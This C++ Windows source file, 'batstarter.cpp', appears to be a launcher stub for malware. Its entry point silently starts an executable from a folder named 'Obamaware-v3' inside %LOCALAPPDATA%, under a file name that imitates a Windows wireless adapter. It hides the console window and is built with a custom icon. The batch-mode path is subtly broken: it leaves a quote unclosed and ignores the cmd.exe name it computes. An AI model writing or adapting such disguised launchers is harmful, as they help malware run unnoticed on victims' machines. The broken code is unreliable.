
#include <windows.h>
#include <string>
#include <vector>

//compile with: cl /std:c++17 /EHsc batstarter.cpp /link user32.lib myicon.res

bool start_process(const char* file, bool batmode = true, const char* exeArgs = nullptr, bool waitfor = false)
{
    // Expand environment variables

    auto expandVars = [](const char* input) -> std::string {
        if (!input) return "";
        DWORD need = ExpandEnvironmentStringsA(input, nullptr, 0);
        if (!need) return "";
        std::vector<char> buf(need);
        ExpandEnvironmentStringsA(input, buf.data(), need);
        return std::string(buf.data());
    };


    DWORD needed = ExpandEnvironmentStringsA(file, nullptr, 0);
    if (!needed) return false;

    std::vector<char> expanded(needed);
    if (!ExpandEnvironmentStringsA(file, expanded.data(), needed))
        return false;

    std::string scriptPath = expanded.data();

    // ---- Build command line ----
    std::vector<char> cmdMutableData;
    char* cmdPtr = nullptr;

    if (batmode) {
        // Batch command with output redirection
        std::string cmdLine =
            std::string("/C \"") + scriptPath;

        cmdMutableData.assign(cmdLine.begin(), cmdLine.end());
        cmdMutableData.push_back('\0');

        cmdPtr = cmdMutableData.data();
    } 
   else {
    // ---- Build command line for EXE ----
        std::string cmdLine;

        // Expand args
        std::string args = expandVars(exeArgs);

        // EXE name must be first
        cmdLine = "\"" + scriptPath + "\"";

        if (!args.empty()) {
            cmdLine += " ";
            cmdLine += args;
        }

        cmdMutableData.assign(cmdLine.begin(), cmdLine.end());
        cmdMutableData.push_back('\0');

        cmdPtr = cmdMutableData.data();
    }

    // ---- Select process name ----
    std::string processName;

    if (batmode)
        processName = "C:\\Windows\\System32\\cmd.exe";
    else
        processName = scriptPath;  // Launch EXE directly

    // ---- Create process ----
    STARTUPINFOA si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);

    BOOL ok = CreateProcessA(
        nullptr,        // Application name
        cmdPtr,                     // Command line (mutable buffer)
        nullptr, nullptr,
        FALSE,
        CREATE_NO_WINDOW,
        nullptr,
        nullptr,
        &si, &pi);

    if (!ok) {
        return false;
    }

    if (waitfor) {
        WaitForSingleObject(pi.hProcess, INFINITE);
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    start_process("%LOCALAPPDATA%\\Obamaware-v3\\Windows Wireless LAN Adapter.exe", false, nullptr, false);

//STARTING_BAT
    return 0;
}
